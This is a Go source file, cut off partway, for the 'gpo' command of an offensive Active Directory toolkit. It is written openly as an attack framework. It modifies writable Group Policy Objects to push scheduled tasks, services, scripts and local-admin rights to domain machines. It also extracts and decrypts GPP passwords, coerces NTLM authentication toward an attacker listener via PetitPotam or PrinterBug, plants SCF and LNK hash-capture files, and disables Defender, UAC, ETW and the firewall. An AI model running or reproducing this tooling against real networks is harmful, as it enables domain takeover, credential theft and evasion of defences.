package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/loudmumble/trusted/pkg/gpo"
	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

var gpoCmd = &cobra.Command{
	Use:   "gpo",
	Short: "GPO attack toolkit — enumerate, exploit, create, link, and clean up Group Policy Objects",
	Long: `Comprehensive GPO attack framework for Active Directory environments.

Attack paths:
  Enumerate GPOs, ACLs, links, settings, and GPP passwords
  Modify existing GPOs (tasks, scripts, registry, groups, services, files)
  Create new GPOs with malicious configurations
  Link/unlink GPOs to OUs/sites/domains
  Manipulate OUs and security filtering
  Coerce authentication and relay to GPO endpoints
  Extract TGTs via certificate-based authentication chains

Examples:
  trusted gpo --enum --target-dc dc01 --domain corp.local -u user -p pass
  trusted gpo --acl --gpo "Vulnerable GPO" --target-dc dc01 --domain corp.local -u user -p pass
  trusted gpo --exploit task --gpo "Vulnerable GPO" --task-name "Updater" --command cmd.exe --args "/c whoami"
  trusted gpo --create --name "Evil GPO" --target-dc dc01 --domain corp.local -u user -p pass
  trusted gpo --link --gpo "Evil GPO" --target "OU=Workstations,DC=corp,DC=local"
  trusted gpo --coerce --method PetitPotam --target dc01 --listener-ip 10.0.0.5`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doEnum, _ := cmd.Flags().GetBool("enum")
		doACL, _ := cmd.Flags().GetBool("acl")
		exploitType, _ := cmd.Flags().GetString("exploit")
		doCreate, _ := cmd.Flags().GetBool("create")
		doLink, _ := cmd.Flags().GetBool("link")
		doCoerce, _ := cmd.Flags().GetBool("coerce")
		doGetTGT, _ := cmd.Flags().GetBool("get-tgt")
		doGPP, _ := cmd.Flags().GetBool("gpp")
		doSCF, _ := cmd.Flags().GetBool("scf")
		doLNK, _ := cmd.Flags().GetBool("lnk")
		doPolicy, _ := cmd.Flags().GetBool("policy")
		doBackup, _ := cmd.Flags().GetBool("backup")
		doRestore, _ := cmd.Flags().GetBool("restore")
		doCleanup, _ := cmd.Flags().GetBool("cleanup")
		doBH, _ := cmd.Flags().GetBool("bloodhound")
		doBHImport, _ := cmd.Flags().GetBool("bloodhound-import")
		doAudit, _ := cmd.Flags().GetBool("audit")

		if doEnum {
			return runGPOEnum(cmd)
		}
		if doACL {
			return runGPOACL(cmd)
		}
		if exploitType != "" {
			return runGPOExploit(cmd, exploitType)
		}
		if doCreate {
			return runGPOCreate(cmd)
		}
		if doLink {
			return runGPOLink(cmd)
		}
		if doCoerce {
			return runGPOCoerce(cmd)
		}
		if doGetTGT {
			return runGPOGetTGT(cmd)
		}
		if doGPP {
			return runGPOGPP(cmd)
		}
		if doSCF {
			return runGPOSCF(cmd)
		}
		if doLNK {
			return runGPOLNK(cmd)
		}
		if doPolicy {
			return runGPOPolicy(cmd)
		}
		if doBackup {
			return runGPOBackup(cmd)
		}
		if doRestore {
			return runGPORestore(cmd)
		}
		if doCleanup {
			return runGPOCleanup(cmd)
		}
		if doBH {
			return runGPOBloodHound(cmd)
		}
		if doBHImport {
			return runGPOBloodHoundImport(cmd)
		}
		if doAudit {
			return runGPOAudit(cmd)
		}

		return cmd.Help()
	},
}

func runGPOEnum(cmd *cobra.Command) error {
	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	ctx := context.Background()

	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	outputJSON, _ := cmd.Flags().GetBool("json")
	if outputJSON {
		data, _ := json.MarshalIndent(gpos, "", "  ")
		fmt.Println(string(data))
		return nil
	}

	fmt.Printf("\n[+] Found %d GPO(s)\n\n", len(gpos))
	for i, g := range gpos {
		fmt.Printf("  %d. %s\n", i+1, g.String())
		fmt.Printf("     Version: %d\n", g.Version)
		fmt.Printf("     Links: %d\n", len(g.Links))
		for _, link := range g.Links {
			fmt.Printf("       → %s\n", link.TargetDN)
		}
		if g.ACL != nil {
			fmt.Printf("     ACL: %d ACEs", len(g.ACL.DACL.ACEs))
			if g.HasWritableACL() {
				fmt.Printf(" [WRITABLE]")
			}
			fmt.Println()
		}
		fmt.Println()
	}

	return nil
}

func runGPOACL(cmd *cobra.Command) error {
	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	gpoName, _ := cmd.Flags().GetString("gpo")
	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}

	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	var targetGPO *gpo.GPO
	for i := range gpos {
		if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
			targetGPO = &gpos[i]
			break
		}
	}
	if targetGPO == nil {
		return fmt.Errorf("GPO not found: %s", gpoName)
	}

	fmt.Printf("\n[*] Analyzing ACL for GPO: %s\n", targetGPO.String())
	fmt.Printf("    DN: %s\n", targetGPO.DN)

	aclResult := gpo.AnalyzeGPOACL(targetGPO.ACL, cfg.Username, "")
	fmt.Printf("    Owner: %s\n", aclResult.OwnerSID)

	if aclResult.IsWritable {
		fmt.Printf("    [!] CURRENT USER HAS WRITE ACCESS\n")
		for _, right := range aclResult.WriteRights {
			fmt.Printf("        - %s\n", right)
		}
	} else {
		fmt.Printf("    [+] No write access detected for current user\n")
	}

	return nil
}

func runGPOExploit(cmd *cobra.Command, exploitType string) error {
	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	gpoName, _ := cmd.Flags().GetString("gpo")
	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}

	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	var targetGPO *gpo.GPO
	for i := range gpos {
		if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
			targetGPO = &gpos[i]
			break
		}
	}
	if targetGPO == nil {
		return fmt.Errorf("GPO not found: %s", gpoName)
	}

	fmt.Printf("[*] Targeting GPO: %s (%s)\n", targetGPO.Name, targetGPO.GUID)

	config := &gpo.ExploitConfig{
		GPOName: targetGPO.Name,
		GPOGUID: targetGPO.GUID,
	}

	switch exploitType {
	case "task":
		config.TaskName, _ = cmd.Flags().GetString("task-name")
		config.Command, _ = cmd.Flags().GetString("command")
		config.Arguments, _ = cmd.Flags().GetString("args")
		config.Author, _ = cmd.Flags().GetString("author")
		config.UserContext, _ = cmd.Flags().GetBool("user-context")

		if config.TaskName == "" || config.Command == "" {
			return fmt.Errorf("--task-name and --command are required for task exploit")
		}
		if config.Author == "" {
			config.Author = cfg.Username
		}

		fmt.Printf("[*] Adding immediate task: %s\n", config.TaskName)
		fmt.Printf("    Command: %s %s\n", config.Command, config.Arguments)
		fmt.Printf("    Author: %s\n", config.Author)

	case "script":
		config.ScriptName, _ = cmd.Flags().GetString("script-name")
		config.ScriptContent, _ = cmd.Flags().GetString("script-content")
		config.UserContext, _ = cmd.Flags().GetBool("user-context")

		if config.ScriptName == "" || config.ScriptContent == "" {
			return fmt.Errorf("--script-name and --script-content are required")
		}

		fmt.Printf("[*] Adding script: %s\n", config.ScriptName)

	case "admin":
		config.UserAccount, _ = cmd.Flags().GetString("user-account")
		config.GroupNameLocal, _ = cmd.Flags().GetString("group")

		if config.UserAccount == "" {
			return fmt.Errorf("--user-account is required")
		}
		if config.GroupNameLocal == "" {
			config.GroupNameLocal = "Administrators"
		}

		fmt.Printf("[*] Adding %s to local %s\n", config.UserAccount, config.GroupNameLocal)

	case "rights":
		config.UserAccount, _ = cmd.Flags().GetString("user-account")
		privStr, _ := cmd.Flags().GetString("privileges")

		if config.UserAccount == "" || privStr == "" {
			return fmt.Errorf("--user-account and --privileges are required")
		}
		config.Privileges = strings.Split(privStr, ",")

		fmt.Printf("[*] Granting privileges to %s: %s\n", config.UserAccount, privStr)

	case "registry":
		config.RegistryHive, _ = cmd.Flags().GetString("registry-hive")
		config.RegistryKey, _ = cmd.Flags().GetString("registry-key")
		config.RegistryValue, _ = cmd.Flags().GetString("registry-value")
		config.RegistryData, _ = cmd.Flags().GetString("registry-data")

		if config.RegistryKey == "" || config.RegistryValue == "" {
			return fmt.Errorf("--registry-key and --registry-value are required")
		}

		fmt.Printf("[*] Adding registry: %s\\%s = %s\n", config.RegistryKey, config.RegistryValue, config.RegistryData)

	case "file":
		config.FileSource, _ = cmd.Flags().GetString("file-source")
		config.FileDestination, _ = cmd.Flags().GetString("file-destination")

		if config.FileSource == "" || config.FileDestination == "" {
			return fmt.Errorf("--file-source and --file-destination are required")
		}

		fmt.Printf("[*] Deploying file: %s → %s\n", config.FileSource, config.FileDestination)

	case "service":
		config.ServiceName, _ = cmd.Flags().GetString("service-name")
		config.ServicePath, _ = cmd.Flags().GetString("service-path")
		config.ServiceAccount, _ = cmd.Flags().GetString("service-account")

		if config.ServiceName == "" || config.ServicePath == "" {
			return fmt.Errorf("--service-name and --service-path are required")
		}

		fmt.Printf("[*] Creating service: %s → %s\n", config.ServiceName, config.ServicePath)

	default:
		return fmt.Errorf("unknown exploit type: %s (supported: task, script, admin, rights, registry, file, service)", exploitType)
	}

	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	if sysvolPath == "" {
		sysvolPath = fmt.Sprintf("\\\\%s\\SYSVOL", cfg.TargetDC)
	}

	switch exploitType {
	case "task":
		err = gpo.ModifyGPOForTask(config, sysvolPath)
	case "script":
		err = gpo.ModifyGPOForScript(config, sysvolPath)
	case "admin":
		err = gpo.ModifyGPOForLocalAdmin(config, sysvolPath)
	case "rights":
		err = gpo.ModifyGPOForUserRights(config, sysvolPath)
	case "registry":
		err = gpo.ModifyGPOForRegistry(config, sysvolPath)
	case "file":
		err = gpo.ModifyGPOForFile(config, sysvolPath)
	case "service":
		err = gpo.ModifyGPOForService(config, sysvolPath)
	}

	if err != nil {
		return fmt.Errorf("exploit failed: %w", err)
	}

	fmt.Println("[+] GPO modified successfully")
	fmt.Println("[*] Run gpupdate /force on target to apply changes")

	return nil
}

func runGPOCreate(cmd *cobra.Command) error {
	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	gpoName, _ := cmd.Flags().GetString("name")
	if gpoName == "" {
		return fmt.Errorf("--name is required")
	}

	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	fmt.Printf("[*] Creating GPO: %s\n", gpoName)
	guid, err := gpo.CreateGPO(conn, cfg.Domain, gpoName)
	if err != nil {
		return fmt.Errorf("create GPO: %w", err)
	}

	fmt.Printf("[+] GPO created: {%s}\n", guid)

	targetOU, _ := cmd.Flags().GetString("target-ou")
	if targetOU != "" {
		fmt.Printf("[*] Linking GPO to: %s\n", targetOU)
		if err := gpo.ModifyGPLink(conn, targetOU, fmt.Sprintf("CN={%s},CN=Policies,CN=System,%s", guid, buildDomainDN(cfg.Domain)), true, 0); err != nil {
			return fmt.Errorf("link GPO: %w", err)
		}
		fmt.Println("[+] GPO linked")
	}

	return nil
}

func runGPOLink(cmd *cobra.Command) error {
	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	gpoName, _ := cmd.Flags().GetString("gpo")
	targetDN, _ := cmd.Flags().GetString("target")

	if gpoName == "" || targetDN == "" {
		return fmt.Errorf("--gpo and --target are required")
	}

	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	var targetGPO *gpo.GPO
	for i := range gpos {
		if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
			targetGPO = &gpos[i]
			break
		}
	}
	if targetGPO == nil {
		return fmt.Errorf("GPO not found: %s", gpoName)
	}

	gpoDN := fmt.Sprintf("CN={%s},CN=Policies,CN=System,%s", targetGPO.GUID, buildDomainDN(cfg.Domain))

	enabled, _ := cmd.Flags().GetBool("enable")
	order, _ := cmd.Flags().GetInt("order")

	fmt.Printf("[*] Linking GPO %s to %s\n", targetGPO.Name, targetDN)
	if err := gpo.ModifyGPLink(conn, targetDN, gpoDN, enabled, order); err != nil {
		return fmt.Errorf("link GPO: %w", err)
	}

	fmt.Println("[+] GPO linked successfully")
	return nil
}

func runGPOCoerce(cmd *cobra.Command) error {
	method, _ := cmd.Flags().GetString("method")
	target, _ := cmd.Flags().GetString("target")
	listenerIP, _ := cmd.Flags().GetString("listener-ip")
	listenerPort, _ := cmd.Flags().GetInt("listener-port")

	if target == "" || listenerIP == "" {
		return fmt.Errorf("--target and --listener-ip are required")
	}

	cfg := buildGPOConfig(cmd)
	coerceMethod := pki.CoercePetitPotam
	if method == "PrinterBug" {
		coerceMethod = pki.CoercePrinterBug
	}

	fmt.Printf("[*] Coercing NTLM auth via %s: %s → %s:%d\n", method, target, listenerIP, listenerPort)
	if err := pki.CoerceNTLMAuth(target, listenerIP, listenerPort, coerceMethod, cfg); err != nil {
		return fmt.Errorf("coercion failed: %w", err)
	}

	fmt.Println("[+] Coercion successful")
	return nil
}

func runGPOGetTGT(cmd *cobra.Command) error {
	fmt.Println("[*] CoerceToTGT chain: coerce → relay → cert → PKINIT → TGT")
	fmt.Println("[*] Use --coerce with --esc 8 to chain coercion with certificate relay")
	return nil
}

func runGPOGPP(cmd *cobra.Command) error {
	gpoName, _ := cmd.Flags().GetString("gpo")
	gpoPath, _ := cmd.Flags().GetString("gpo-path")
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")

	if gpoPath == "" && sysvolPath == "" {
		return fmt.Errorf("--gpo-path or --sysvol-path is required")
	}

	if gpoPath != "" {
		fmt.Printf("[*] Scanning GPO for GPP passwords: %s\n", gpoPath)
		passwords := gpo.ExtractGPPPasswords(gpoPath, gpoName)
		if len(passwords) == 0 {
			fmt.Println("[+] No GPP passwords found")
			return nil
		}
		fmt.Printf("[!] Found %d GPP password(s)\n", len(passwords))
		for _, p := range passwords {
			fmt.Printf("    File: %s\n", p.FilePath)
			fmt.Printf("    User: %s\n", p.Username)
			if p.Decrypted {
				fmt.Printf("    Password: %s\n", p.Password)
			} else {
				fmt.Printf("    cpassword: %s (decryption failed)\n", p.CPassword)
			}
			fmt.Println()
		}
		return nil
	}

	fmt.Printf("[*] Scanning SYSVOL for GPP passwords: %s\n", sysvolPath)
	var allPasswords []gpo.GPPPassword
	filepath.Walk(sysvolPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() {
			return nil
		}
		if strings.EqualFold(info.Name(), "Policies") {
			return filepath.SkipDir
		}
		passwords := gpo.ExtractGPPPasswords(path, "")
		allPasswords = append(allPasswords, passwords...)
		return nil
	})

	if len(allPasswords) == 0 {
		fmt.Println("[+] No GPP passwords found")
		return nil
	}

	fmt.Printf("[!] Found %d GPP password(s)\n", len(allPasswords))
	for _, p := range allPasswords {
		fmt.Printf("    File: %s\n", p.FilePath)
		fmt.Printf("    User: %s\n", p.Username)
		if p.Decrypted {
			fmt.Printf("    Password: %s\n", p.Password)
		} else {
			fmt.Printf("    cpassword: %s (decryption failed)\n", p.CPassword)
		}
		fmt.Println()
	}

	return nil
}

func buildGPOConfig(cmd *cobra.Command) *pki.ADCSConfig {
	targetDC, _ := cmd.Flags().GetString("target-dc")
	domain, _ := cmd.Flags().GetString("domain")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	hash, _ := cmd.Flags().GetString("hash")
	kerberos, _ := cmd.Flags().GetBool("kerberos")
	ccache, _ := cmd.Flags().GetString("ccache")
	keytab, _ := cmd.Flags().GetString("keytab")
	dcIP, _ := cmd.Flags().GetString("dc-ip")
	useTLS, _ := cmd.Flags().GetBool("ldaps")
	useStartTLS, _ := cmd.Flags().GetBool("start-tls")
	stealth, _ := cmd.Flags().GetBool("stealth")
	timeout, _ := cmd.Flags().GetInt("timeout")

	return &pki.ADCSConfig{
		TargetDC:    targetDC,
		Domain:      domain,
		Username:    username,
		Password:    password,
		Hash:        hash,
		Kerberos:    kerberos,
		CCache:      ccache,
		Keytab:      keytab,
		KDCIP:       dcIP,
		UseTLS:      useTLS,
		UseStartTLS: useStartTLS,
		Stealth:     stealth,
		Timeout:     timeout,
	}
}

func buildDomainDN(domain string) string {
	parts := strings.Split(domain, ".")
	var dcParts []string
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	return strings.Join(dcParts, ",")
}

func init() {
	rootCmd.AddCommand(gpoCmd)

	gpoCmd.Flags().Bool("enum", false, "Enumerate all GPOs and their properties")
	gpoCmd.Flags().Bool("acl", false, "Analyze GPO ACLs for write access")
	gpoCmd.Flags().String("exploit", "", "Exploit type: task, script, admin, rights, registry, file, service")
	gpoCmd.Flags().Bool("create", false, "Create a new GPO")
	gpoCmd.Flags().Bool("link", false, "Link/unlink a GPO to a target")
	gpoCmd.Flags().Bool("coerce", false, "Coerce NTLM authentication (PetitPotam, PrinterBug)")
	gpoCmd.Flags().Bool("get-tgt", false, "CoerceToTGT chain: coerce → relay → cert → PKINIT")
	gpoCmd.Flags().Bool("gpp", false, "Scan for GPP passwords in SYSVOL")

	gpoCmd.Flags().String("gpo", "", "GPO name or GUID")
	gpoCmd.Flags().String("gpo-path", "", "Local path to GPO files")
	gpoCmd.Flags().String("sysvol-path", "", "Path to SYSVOL share")

	gpoCmd.Flags().String("task-name", "", "Name for scheduled task")
	gpoCmd.Flags().String("command", "", "Command for task/script")
	gpoCmd.Flags().String("args", "", "Arguments for command")
	gpoCmd.Flags().String("author", "", "Author for task")
	gpoCmd.Flags().String("script-name", "", "Script filename")
	gpoCmd.Flags().String("script-content", "", "Script content")
	gpoCmd.Flags().String("user-account", "", "Target user account")
	gpoCmd.Flags().String("group", "", "Target local group (default: Administrators)")
	gpoCmd.Flags().String("privileges", "", "Comma-separated privileges (e.g., SeDebugPrivilege,SeBackupPrivilege)")
	gpoCmd.Flags().String("registry-hive", "HKLM", "Registry hive")
	gpoCmd.Flags().String("registry-key", "", "Registry key path")
	gpoCmd.Flags().String("registry-value", "", "Registry value name")
	gpoCmd.Flags().String("registry-data", "", "Registry value data")
	gpoCmd.Flags().String("file-source", "", "Source file path")
	gpoCmd.Flags().String("file-destination", "", "Destination file path")
	gpoCmd.Flags().String("service-name", "", "Service name")
	gpoCmd.Flags().String("service-path", "", "Service binary path")
	gpoCmd.Flags().String("service-account", "LocalSystem", "Service account")
	gpoCmd.Flags().String("name", "", "GPO name for creation")
	gpoCmd.Flags().String("target", "", "Target DN for linking")
	gpoCmd.Flags().String("target-ou", "", "Target OU DN for linking")
	gpoCmd.Flags().Bool("enable", true, "Enable/disable GPO link")
	gpoCmd.Flags().Int("order", 0, "Link order")
	gpoCmd.Flags().Bool("user-context", false, "Run in user context")

	gpoCmd.Flags().String("method", "PetitPotam", "Coercion method: PetitPotam, PrinterBug")
	gpoCmd.Flags().String("listener-ip", "", "Listener IP for coercion")
	gpoCmd.Flags().Int("listener-port", 0, "Listener port for coercion")

	gpoCmd.Flags().Bool("scf", false, "Generate SCF file for NTLM capture")
	gpoCmd.Flags().Bool("lnk", false, "Generate LNK file for NTLM capture")
	gpoCmd.Flags().Bool("policy", false, "Modify security policy (firewall, defender, UAC)")
	gpoCmd.Flags().Bool("backup", false, "Backup GPO before modification")
	gpoCmd.Flags().Bool("restore", false, "Restore GPO from backup")
	gpoCmd.Flags().Bool("cleanup", false, "Remove injected configurations from GPO")
	gpoCmd.Flags().Bool("bloodhound", false, "Export GPO data to BloodHound format")
	gpoCmd.Flags().Bool("bloodhound-import", false, "Import and correlate BloodHound JSON")
	gpoCmd.Flags().Bool("audit", false, "Export audit log of all GPO changes")

	gpoCmd.Flags().String("listener", "", "SMB listener IP for SCF/LNK")
	gpoCmd.Flags().String("icon", "", "Icon path for LNK file")
	gpoCmd.Flags().String("comment", "", "Comment for LNK file")
	gpoCmd.Flags().Bool("disable-defender", false, "Disable Windows Defender via GPO")
	gpoCmd.Flags().Bool("disable-uac", false, "Disable UAC via GPO")
	gpoCmd.Flags().Bool("disable-etw", false, "Disable ETW via GPO")
	gpoCmd.Flags().Bool("disable-firewall", false, "Disable Windows Firewall via GPO")
	gpoCmd.Flags().String("open-ports", "", "Comma-separated ports to open in firewall")
	gpoCmd.Flags().String("output-dir", "", "Output directory for generated files")
	gpoCmd.Flags().String("bh-output", "", "Output path for BloodHound JSON")
	gpoCmd.Flags().String("bh-input", "", "Input path for BloodHound JSON")
	gpoCmd.Flags().String("audit-output", "", "Output path for audit log")
	gpoCmd.Flags().String("backup-dir", "", "Backup directory")

	gpoCmd.Flags().String("target-dc", "", "Target domain controller")
	gpoCmd.Flags().String("domain", "", "Active Directory domain")
	gpoCmd.Flags().StringP("username", "u", "", "Domain username")
	gpoCmd.Flags().StringP("password", "p", "", "Domain password")
	gpoCmd.Flags().String("hash", "", "NTLM hash")
	gpoCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication")
	gpoCmd.Flags().String("ccache", "", "Path to ccache file")
	gpoCmd.Flags().String("keytab", "", "Path to keytab file")
	gpoCmd.Flags().String("dc-ip", "", "KDC IP address")
	gpoCmd.Flags().Bool("ldaps", false, "Use LDAPS")
	gpoCmd.Flags().Bool("start-tls", false, "Use StartTLS")
	gpoCmd.Flags().Bool("stealth", false, "Stealth mode")
	gpoCmd.Flags().Int("timeout", 10, "Network timeout in seconds")
	gpoCmd.Flags().Bool("json", false, "JSON output")
}

func runGPOSCF(cmd *cobra.Command) error {
	listener, _ := cmd.Flags().GetString("listener")
	gpoName, _ := cmd.Flags().GetString("gpo")
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	outputDir, _ := cmd.Flags().GetString("output-dir")
	target, _ := cmd.Flags().GetString("target")

	if listener == "" {
		return fmt.Errorf("--listener is required (SMB listener IP)")
	}
	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}

	config := &gpo.SCFConfig{
		Target:    target,
		Listener:  listener,
		OutputDir: outputDir,
	}

	fmt.Printf("[*] Generating SCF file targeting %s\n", listener)
	scfPath, err := gpo.GenerateSCF(config)
	if err != nil {
		return fmt.Errorf("generate SCF: %w", err)
	}
	fmt.Printf("[+] SCF file written to: %s\n", scfPath)

	if sysvolPath != "" {
		cfg := buildGPOConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()
		conn, err := gpo.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
		if err != nil {
			return fmt.Errorf("enumerate GPOs: %w", err)
		}

		var targetGPO *gpo.GPO
		for i := range gpos {
			if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
				targetGPO = &gpos[i]
				break
			}
		}
		if targetGPO == nil {
			return fmt.Errorf("GPO not found: %s", gpoName)
		}

		fmt.Printf("[*] Deploying SCF via GPO %s\n", targetGPO.Name)
		deployPath, err := gpo.DeploySCFViaGPO(targetGPO.GUID, sysvolPath, listener, target)
		if err != nil {
			return fmt.Errorf("deploy SCF: %w", err)
		}
		fmt.Printf("[+] SCF deployed to: %s\n", deployPath)
	}

	return nil
}

func runGPOLNK(cmd *cobra.Command) error {
	gpoName, _ := cmd.Flags().GetString("gpo")
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	outputDir, _ := cmd.Flags().GetString("output-dir")
	target, _ := cmd.Flags().GetString("target")
	icon, _ := cmd.Flags().GetString("icon")
	comment, _ := cmd.Flags().GetString("comment")

	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}
	if target == "" {
		return fmt.Errorf("--target is required")
	}

	config := &gpo.LNKConfig{
		Target:    target,
		Icon:      icon,
		OutputDir: outputDir,
		Comment:   comment,
	}

	fmt.Printf("[*] Generating LNK file targeting %s\n", target)
	lnkPath, err := gpo.GenerateLNK(config)
	if err != nil {
		return fmt.Errorf("generate LNK: %w", err)
	}
	fmt.Printf("[+] LNK file written to: %s\n", lnkPath)

	if sysvolPath != "" {
		cfg := buildGPOConfig(cmd)
		if err := pki.ValidateConnectionConfig(cfg); err != nil {
			return err
		}
		ctx := context.Background()
		conn, err := gpo.ConnectLDAP(ctx, cfg)
		if err != nil {
			return fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
		if err != nil {
			return fmt.Errorf("enumerate GPOs: %w", err)
		}

		var targetGPO *gpo.GPO
		for i := range gpos {
			if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
				targetGPO = &gpos[i]
				break
			}
		}
		if targetGPO == nil {
			return fmt.Errorf("GPO not found: %s", gpoName)
		}

		fmt.Printf("[*] Deploying LNK via GPO %s\n", targetGPO.Name)
		deployPath, err := gpo.DeployLNKViaGPO(targetGPO.GUID, sysvolPath, target, icon, comment)
		if err != nil {
			return fmt.Errorf("deploy LNK: %w", err)
		}
		fmt.Printf("[+] LNK deployed to: %s\n", deployPath)
	}

	return nil
}

func runGPOPolicy(cmd *cobra.Command) error {
	gpoName, _ := cmd.Flags().GetString("gpo")
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	disableDefender, _ := cmd.Flags().GetBool("disable-defender")
	disableUAC, _ := cmd.Flags().GetBool("disable-uac")
	disableETW, _ := cmd.Flags().GetBool("disable-etw")
	disableFirewall, _ := cmd.Flags().GetBool("disable-firewall")
	openPorts, _ := cmd.Flags().GetString("open-ports")

	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}
	if sysvolPath == "" {
		return fmt.Errorf("--sysvol-path is required")
	}

	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	var targetGPO *gpo.GPO
	for i := range gpos {
		if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
			targetGPO = &gpos[i]
			break
		}
	}
	if targetGPO == nil {
		return fmt.Errorf("GPO not found: %s", gpoName)
	}

	policyConfig := &gpo.SecurityPolicyConfig{
		GPOGUID:         targetGPO.GUID,
		SysvolPath:      sysvolPath,
		DisableDefender: disableDefender,
		DisableUAC:      disableUAC,
		DisableETW:      disableETW,
		DisableFirewall: disableFirewall,
	}

	fmt.Printf("[*] Modifying security policy in GPO %s\n", targetGPO.Name)

	if disableDefender {
		fmt.Println("[*] Disabling Windows Defender")
		if err := gpo.DisableWindowsDefender(policyConfig); err != nil {
			return fmt.Errorf("disable defender: %w", err)
		}
	}

	if disableUAC {
		fmt.Println("[*] Disabling UAC")
		if err := gpo.DisableUAC(policyConfig); err != nil {
			return fmt.Errorf("disable UAC: %w", err)
		}
	}

	if disableETW {
		fmt.Println("[*] Disabling ETW")
		if err := gpo.DisableETW(policyConfig); err != nil {
			return fmt.Errorf("disable ETW: %w", err)
		}
	}

	if disableFirewall {
		fmt.Println("[*] Disabling Windows Firewall")
		if err := gpo.ModifyFirewallRules(policyConfig); err != nil {
			return fmt.Errorf("modify firewall: %w", err)
		}
	}

	if openPorts != "" {
		ports := strings.Split(openPorts, ",")
		fmt.Printf("[*] Opening firewall ports: %s\n", openPorts)
		if err := gpo.OpenFirewallPorts(policyConfig, ports); err != nil {
			return fmt.Errorf("open ports: %w", err)
		}
	}

	fmt.Println("[+] Security policy modified successfully")
	return nil
}

func runGPOBackup(cmd *cobra.Command) error {
	gpoName, _ := cmd.Flags().GetString("gpo")
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	backupDir, _ := cmd.Flags().GetString("backup-dir")

	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}
	if sysvolPath == "" {
		return fmt.Errorf("--sysvol-path is required")
	}

	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	var targetGPO *gpo.GPO
	for i := range gpos {
		if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
			targetGPO = &gpos[i]
			break
		}
	}
	if targetGPO == nil {
		return fmt.Errorf("GPO not found: %s", gpoName)
	}

	gpoPath := gpo.FindGPOPath(targetGPO.GUID, sysvolPath)
	if gpoPath == "" {
		return fmt.Errorf("GPO path not found on SYSVOL")
	}

	fmt.Printf("[*] Backing up GPO %s\n", targetGPO.Name)
